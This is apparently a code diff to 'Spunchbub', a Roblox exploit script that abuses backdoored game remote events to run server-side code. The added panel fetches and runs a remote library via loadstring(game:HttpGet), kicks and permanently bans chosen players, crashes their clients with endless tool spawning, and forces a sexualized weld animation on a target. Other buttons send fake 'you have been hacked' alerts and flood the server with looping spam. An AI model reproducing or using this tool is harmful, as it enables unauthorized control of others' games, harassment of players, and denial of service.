@@ -1245,10 +1245,10 @@ local suspiciousKeywords = {
     "hd admin","ranker","java1","darklord","pracharatbampen","777ililo",
     "sugma","ro xploit","secret service panel","kid","666","n00t","ximi",
     "k1d","kidd","k1dd","k00p","tubers","h01pk","ban","dreambull","krnkidssus",
-    "ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","l00pz",
+    "ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","l00pz","change map",
     "xxandresxx","c00lgui","c00l","elmarz","teamf*t","teamfat","koop",
     "5x5x5x5","g00b","kick","undetectable gui","undetectable","c00lkidd",
-    "acron","russia","infector","potato","sans_gboard","777lilo",
+    "acron","russia","infector","potato","sans_gboard","777lilo","g00by",
     "starp4tch","user1337","menotgonnadobadstuff","team fat","traffix",
     "8t010t8","darius","j00p","144anz","sigma","topkek","polaria",
     "noot","1x1x1x1","lacking923","kaax","s1n","topk3k","decal spam",
@@ -1335,9 +1335,290 @@ Players.PlayerAdded:Connect(function(player)
     task.spawn(monitorPlayer, player)
 end)
 ]])
-    
+
+fireRemoteEvent([[
+	local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/systemzyx/betterlibs/refs/heads/main/betteruilib.lua"))()
+	local CommandsMenu = library:Window("Spunchbub - Private Admin")
+	
+	local selectedPlayer = nil
+	local function findPlayer(name)
+		for _, player in pairs(game.Players:GetPlayers()) do
+			if string.find(string.lower(player.Name), string.lower(name)) or string.find(string.lower(player.DisplayName), string.lower(name)) then
+				return player
+			end
+		end
+		return nil
+	end
+	local selectedPlayerLabel = CommandsMenu:Label("Selected Player: N/A")
+	
+	CommandsMenu:Textbox("Target Player", "Username", function(playertc)
+		selectedPlayer = findPlayer(playertc)
+		if selectedPlayer then
+			selectedPlayerLabel.Text = "Selected Player: " .. selectedPlayer.DisplayName
+		else
+			selectedPlayerLabel.Text = "Player not found"
+		end
+	end)
+	
+	CommandsMenu:Button("Kick Player", function()
+		if selectedPlayer then
+			fireRemoteEvent('for i,v in pairs(game.Players:GetPlayers()) do if v.Name == "' .. selectedPlayer.Name .. '" then v:Kick("You have been kicked") end end')
+		end
+	end)
+	CommandsMenu:Button("Perm BanAsync Player", function()
+		if selectedPlayer and selectedPlayer ~= game.Players.LocalPlayer then
+			fireRemoteEvent([[
+				local Players = game:GetService("Players")
+				local targetUserId = ]] .. selectedPlayer.UserId .. [[
+				if targetUserId ~= ]] .. game.Players.LocalPlayer.UserId .. [[ then
+					pcall(function()
+						Players:BanAsync({
+							UserIds = {targetUserId},
+							Duration = -1,
+							DisplayReason = "You've been Perma-BANNED.",
+							PrivateReason = "hahaha",
+							ExcludeAltAccounts = false,
+							ApplyToUniverse = true
+						})
+					end)
+				end
+			]])
+		else
+			selectedPlayerLabel.Text = "Cannot ban yourself!"
+		end
+	end)
+	CommandsMenu:Button("Reset Player", function()
+		if selectedPlayer then 
+			fireRemoteEvent("game.Players." .. selectedPlayer.Name .. ":LoadCharacter()")
+		end
+	end)
+	CommandsMenu:Button("D#ck Player", function()
+		if selectedPlayer then 
+			fireRemoteEvent('require(140321069022189).pingas("' .. selectedPlayer.Name .. '")')
+		end
+	end)
+	CommandsMenu:Button("Crash Player", function()
+		if selectedPlayer then 
+	       local code = [[
+	local function addtool()
+	local tool = Instance.new("Tool")
+	tool.ToolTip = string.rep("A", 200)
+	tool.Name = string.rep("A", 200)
+	tool.CanBeDropped = false
+	tool.Parent = game.Players["]] .. selectedPlayer.Name .. [["].Backpack
+	end
+	
+	for b = 1, 9007199254740991 do
+	task.spawn(function()
+	addtool()
+	end)
+	end
+	]]
+	
+	fireRemoteEvent(code)
+		end
+	end)
+	CommandsMenu:Button("F#ck Player", function()
+		if selectedPlayer then 
+			fireRemoteEvent([[
+	function fWeld(zName, zParent, zPart0, zPart1, zCoco, a, b, c, d, e, f)
+	local funcw = Instance.new("Weld")
+	funcw.Name = zName
+	funcw.Parent = zParent
+	funcw.Part0 = zPart0
+	funcw.Part1 = zPart1
+	if (zCoco == true) then
+	funcw.C0 = CFrame.new(a, b, c) * CFrame.fromEulerAnglesXYZ(d, e, f)
+	else
+	funcw.C1 = CFrame.new(a, b, c) * CFrame.fromEulerAnglesXYZ(d, e, f)
+	end
+	return funcw
+	end
+	function fun(n1, n2)
+	pcall(function()
+	t1 = game.Players[n1].Character.Torso
+	t2 = game.Players[n2].Character.Torso
+	t2.Parent.Humanoid.PlatformStand = true
+	t1["Left Shoulder"]:Remove()
+	ls1 = Instance.new("Weld")
+	ls1.Parent = t1
+	ls1.Part0 = t1
+	ls1.Part1 = t1.Parent["Left Arm"]
+	ls1.C0 = CFrame.new(-1.5,0,0)
+	ls1.Name = "Left Shoulder"
+	t1["Right Shoulder"]:Remove()
+	rs1 = Instance.new("Weld")
+	rs1.Parent = t1
+	rs1.Part0 = t1
+	rs1.Part1 = t1.Parent["Right Arm"]
+	rs1.C0 = CFrame.new(1.5,0,0)
+	rs1.Name = "Right Shoulder"
+	t2["Left Shoulder"]:Remove()
+	ls2 = Instance.new("Weld")
+	ls2.Parent = t2
+	ls2.Part0 = t2
+	ls2.Part1 = t2.Parent["Left Arm"]
+	ls2.C0 = CFrame.new(-1.5,0,0)
+	ls2.Name = "Left Shoulder"
+	t2["Right Shoulder"]:Remove()
+	rs2 = Instance.new("Weld")
+	rs2.Parent = t2
+	rs2.Part0 = t2
+	rs2.Part1 = t2.Parent["Right Arm"]
+	rs2.C0 = CFrame.new(1.5,0,0)
+	rs2.Name = "Right Shoulder"
+	t2["Left Hip"]:Remove()
+	lh2 = Instance.new("Weld")
+	lh2.Parent = t2
+	lh2.Part0 = t2
+	lh2.Part1 = t2.Parent["Left Leg"]
+	lh2.C0 = CFrame.new(-0.5,-2,0)
+	lh2.Name = "Left Hip"
+	t2["Right Hip"]:Remove()
+	rh2 = Instance.new("Weld")
+	rh2.Parent = t2
+	rh2.Part0 = t2
+	rh2.Part1 = t2.Parent["Right Leg"]
+	rh2.C0 = CFrame.new(0.5,-2,0)
+	rh2.Name = "Right Hip"
+	local d = Instance.new("Part")
+	d.TopSurface = 0
+	d.BottomSurface = 0
+	d.BrickColor = BrickColor.new("Medium stone grey")
+	d.Shape = "Ball"
+	d.Parent = t1
+	d.Size = Vector3.new(1,1,1)
+	local dm = Instance.new("SpecialMesh")
+	dm.MeshType = "Sphere"
+	dm.Parent = d
+	dm.Scale = Vector3.new(0.4,0.4,0.4)
+	fWeld("weld",t1,t1,d,true,-0.2,-1.3,-0.6,0,0,0)
+	d2 = d:Clone()
+	d2.Parent = t1
+	fWeld("weld",t1,t1,d2,true,0.2,-1.3,-0.6,0,0,0)
+	local c = Instance.new("Part")
+	c.TopSurface = 0
+	c.BottomSurface = 0
+	c.CanCollide = false
+	c.BrickColor = BrickColor.new("Pastel brown")
+	c.Parent = t1
+	c.formFactor = "Custom"
+	c.Size = Vector3.new(0.4,1.3,0.4)
+	cm = Instance.new("CylinderMesh")
+	cm.Parent = c
+	a = fWeld("weld",t1,t1,c,true,0,-1,-0.52+(-c.Size.y/2),math.rad(-80),0,0)
+	c2 = d:Clone()
+	c2.BrickColor = BrickColor.new("Medium stone grey")
+	c2.Mesh.Scale = Vector3.new(0.4,0.62,0.4)
+	c2.Parent = t1
+	fWeld("weld",c,c,c2,true,0,0+(c.Size.y/2),0,math.rad(-10),0,0)
+	local bl = Instance.new("Part")
+	bl.TopSurface = 0
+	bl.BottomSurface = 0
+	bl.CanCollide = false
+	bl.BrickColor = BrickColor.new("Pastel brown")
+	bl.Shape = "Ball"
+	bl.Parent = t2
+	bl.Size = Vector3.new(1,1,1)
+	local dm = Instance.new("SpecialMesh")
+	dm.MeshType = "Sphere"
+	dm.Parent = bl
+	dm.Scale = Vector3.new(1.2,1.2,1.2)
+	fWeld("weld",t2,t2,bl,true,-0.5,0.5,-0.6,0,0,0)
+	local br = Instance.new("Part")
+	br.TopSurface = 0
+	br.BottomSurface = 0
+	br.CanCollide = false
+	br.BrickColor = BrickColor.new("Pastel brown")
+	br.Shape = "Ball"
+	br.Parent = t2
+	br.Size = Vector3.new(1,1,1)
+	local dm = Instance.new("SpecialMesh")
+	dm.MeshType = "Sphere"
+	dm.Parent = br
+	dm.Scale = Vector3.new(1.2,1.2,1.2)
+	fWeld("weld",t2,t2,br,true,0.5,0.5,-0.6,0,0,0)
+	local bln = Instance.new("Part")
+	bln.TopSurface = 0
+	bln.BottomSurface = 0
+	bln.CanCollide = false
+	bln.Shape = "Ball"
+	bln.Parent = t2
+	bln.Size = Vector3.new(1,1,1)
+	local dm = Instance.new("SpecialMesh")
+	dm.MeshType = "Sphere"
+	dm.Parent = bln
+	dm.Scale = Vector3.new(0.2,0.2,0.2)
+	fWeld("weld",t2,t2,bln,true,-0.5,0.5,-1.2,0,0,0)
+	local brn = Instance.new("Part")
+	brn.TopSurface = 0
+	brn.BottomSurface = 0
+	brn.CanCollide = false
+	brn.Shape = "Ball"
+	brn.Parent = t2
+	brn.Size = Vector3.new(1,1,1)
+	local dm = Instance.new("SpecialMesh")
+	dm.MeshType = "Sphere"
+	dm.Parent = brn
+	dm.Scale = Vector3.new(0.2,0.2,0.2)
+	fWeld("weld",t2,t2,brn,true,0.5,0.5,-1.2,0,0,0)
+	lh2.C1 = CFrame.new(0,-1.5,-0.5) * CFrame.Angles(0.9,-0.4,0)
+	rh2.C1 = CFrame.new(0,-1.5,-0.5) * CFrame.Angles(0.9,0.4,0)
+	ls2.C1 = CFrame.new(-0.5,-1.3,-0.5) * CFrame.Angles(0.9,-0.4,0)
+	rs2.C1 = CFrame.new(0.5,-1.3,-0.5) * CFrame.Angles(0.9,0.4,0)
+	ls1.C1 = CFrame.new(-0.5,0.7,0) * CFrame.Angles(-0.9,-0.4,0)
+	rs1.C1 = CFrame.new(0.5,0.7,0) * CFrame.Angles(-0.9,0.4,0)
+	if t1:findFirstChild("weldx") ~= nil then
+	t1.weldx:Remove()
+	end
+	we = fWeld("weldx", t1, t1, t2, true, 0, -0.9, -1.3, math.rad(-90), 0, 0)
+	n = t2.Neck
+	n.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
+	end)
+	coroutine.resume(coroutine.create(function()
+	while wait() do
+	for i = 1,6 do
+	we.C1 = we.C1 * CFrame.new(0,-0.3,0)
+	wait()
+	end
+	 
+	for i = 1,6 do
+	we.C1 = we.C1 * CFrame.new(0,0.3,0)
+	wait()
+	end
+	end
+	end))
+	end
+	fun("]] .. game.Players.LocalPlayer.Name .. [[", "]] .. selectedPlayer.Name .. [[")
+	]])
+		end
+	end)
+	CommandsMenu:Button("Silly Player", function()
+		if selectedPlayer then 
+			fireRemoteEvent('require(78730160118005).justabitsilly("' .. selectedPlayer.Name .. '")')
+		end
+	end)
+	CommandsMenu:Button("Hack alert Player", function()
+		if selectedPlayer then 
+			fireRemoteEvent('require(10557341183).alert("' .. selectedPlayer.Name .. '", "YOU HAVE BEEN HACKED BY C00LKIDD!!!")')
+		end
+	end)
+	CommandsMenu:Button("Lava CHIICKEN", function()
+			fireRemoteEvent('local s=Instance.new("Sound",workspace);s.SoundId="rbxassetid://111172243066964";s.Looped=true;s:Play()')
+			fireRemoteEvent('require(78976842635186)')
+			fireRemoteEvent('while true do for _,p in ipairs(game:GetService("Players"):GetPlayers()) do local bp=p:FindFirstChild("Backpack") if bp then local t=Instance.new("Tool") t.RequiresHandle=false local e={"🐔","💥","🍗","🔥","💀","🥵","🤝","🥴","😏","😰"} t.Name="chicken_"..math.random(100000,999999999)..e[math.random(1,#e)]..e[math.random(1,#e)]..e[math.random(1,#e)] t.Parent=bp end end task.wait(0.1) end')
+	end)
+	CommandsMenu:Button("Death?", function()
+			fireRemoteEvent('local s=Instance.new("Sound",workspace)s.Name="death."s.SoundId="rbxassetid://rbxassetid://35930009"s:Play()s.Looped=true')
+			fireRemoteEvent('require(15413579595):Death()')
+	end)
+	CommandsMenu:Button("EL MAXWELL!!", function()
+			fireRemoteEvent('local s=Instance.new("Sound",workspace)s.Name="EL GATO or MASWELL"s.SoundId="rbxassetid://104483584177040"s:Play()s.Looped=true repeat wait(0.01) until s.IsLoaded==true wait(2)local d=Instance.new("DistortionSoundEffect",s)d.Level=0.8 local sky=Instance.new("Sky",game:GetService("Lighting"))sky.SkyboxBk="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxFt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxLf="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxRt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxUp="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxDn="http://www.roblox.com/asset/?id=4575171289"sky.CelestialBodiesShown=false sky.StarCount=999999999999999999 for _,p in ipairs(game:GetService("Players"):GetPlayers())do if p.Character then p.Character:Destroy()end end local l=game:GetService("Lighting")l.FogEnd=1000 l.FogStart=900 l.FogColor=Color3.new(math.random(),math.random(),math.random()) local m=Instance.new("Message",workspace)m.Text="oooo nice computer you got there can i have it" local t=game:FindFirstChild("Teams")if t then t:ClearAllChildren()end while true do wait(0.01) if t then local tm=Instance.new("Team",t)tm.Name="maxwell real?!?"..tostring(math.random(1,33373))tm.TeamColor=BrickColor.Random()end for i=1,15 do local c=Instance.new("Part",workspace)local ms=Instance.new("SpecialMesh",c)ms.MeshType=Enum.MeshType.FileMesh ms.MeshId="rbxassetid://4934166503"ms.TextureId="rbxassetid://4934166532"c.Touched:Connect(function(o)o:Destroy()end)c.Size=Vector3.new(6.502,11.339,14.281)c.CFrame=CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))end end')
+	end)
+]])
+
 fireRemoteEvent('require(3986243232).load("spunchbub anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
-        notify.Info("Spunchbub","Backdoor found! Implemented backdoor protection & anti ban.")
+        notify.Info("Spunchbub","Backdoor found! Implemented backdoor protection & anti skid.")
     else
         notify.Warn("Spunchbub","No backdoor found.")
         LMG2["ScanButton_c"]["Text"] = "No backdoor found :("
